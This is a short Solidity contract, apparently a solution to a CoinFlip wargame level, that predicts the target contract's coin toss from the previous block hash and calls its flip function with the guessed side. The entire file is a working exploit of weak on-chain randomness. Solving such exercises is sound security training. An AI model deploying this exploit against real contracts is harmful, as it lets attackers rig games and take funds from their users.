// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./coinflip.sol";

contract attackCoinFlip {
    CoinFlip public coinflip;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _coinflip) public {
        coinflip = CoinFlip(_coinflip);
    }

    function flip() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        coinflip.flip(side);
    }
}
